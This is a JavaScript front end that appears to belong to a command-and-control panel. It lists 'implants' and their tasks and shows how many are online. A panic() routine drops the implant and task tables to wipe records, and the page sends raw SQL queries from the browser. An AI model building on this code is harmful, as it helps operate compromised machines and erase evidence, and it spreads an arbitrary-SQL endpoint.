const agentList = document.getElementById('agentList');
const taskList = document.getElementById('taskList');

let agents=[], tasks = [];

function openTab(evt, tabName) {
  // Declare all variables
  var i, tabcontent, tablinks;

  // Get all elements with class="tabcontent" and hide them
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }

  // Get all elements with class="tablinks" and remove the class "active"
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }

  // Show the current tab, and add an "active" class to the button that opened the tab
  document.getElementById(tabName).style.display = "block";
  evt.currentTarget.className += " active";
}

function refresh() {
  let ri = httpPost('/query',"SELECT * FROM implants");
  let rt = httpPost('/query',"SELECT * FROM tasks");
  let rm = httpPost('/query',"SELECT MAX(tasks.id) FROM tasks");
  let offline=0,uptime=0,total = 0,meow='';
  agents = JSON.parse(ri);
  tasks = JSON.parse(rt);
  let last_task_id = JSON.parse(rm);
  
  agents.forEach(agent => {
    meow +='<a href=/agent/'+ agent[0] +'><button><li> '+agent[0] + ' - ' + agent[4] + '\\' + agent[5];
    if(Math.abs(new Date() - new Date(agent[2].replace(/-/g,'/')))>30000){
      meow+='<div class="offline">offline';
      offline++;
    }else{
      meow+='<div class="online">online';
    }
    meow+='</div></li></button></a>';
    total++;
  });
  agentList.innerHTML = meow;
  document.getElementById('percentage').style.transform ='rotate('+(total-offline)/total*180+'deg)';
  document.getElementById('gaugetxt').innerHTML = ((total-offline)/total*100).toFixed(1) + '%<br />is online!';
  uptime = httpPost('/uptime','');
  document.getElementById('uptime').innerText='uptime: ' + uptime;
  taskList.innerHTML='';
  tasks.forEach(task => {taskList.innerHTML+='<a href=/task/'+ task[0] +'><button><li> '+task+'</li></button></a>';});
  taskList.innerHTML+='<a href=/task/'+ last_task_id +'><button><li> +'+last_task_id+' </li></button></a>';
} 

function panic() {
  httpPost('/query',"DROP TABLE implants");
  httpPost('/query',"DROP TABLE implant_task");
  httpPost('/query',"DROP TABLE tasks");
  httpPost('/query',"DROP TABLE actions");
}

function httpPost(url,query)
{
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open( "POST", url, false );
  xmlHttp.send(query);
  return xmlHttp.responseText;
}

setInterval(refresh, 5000);
document.addEventListener('DOMContentLoaded', function() {
  refresh();
});
document.getElementById('Overview').style.display = 'block';
document.getElementsByClassName('tablinks')[0].className += ' active';
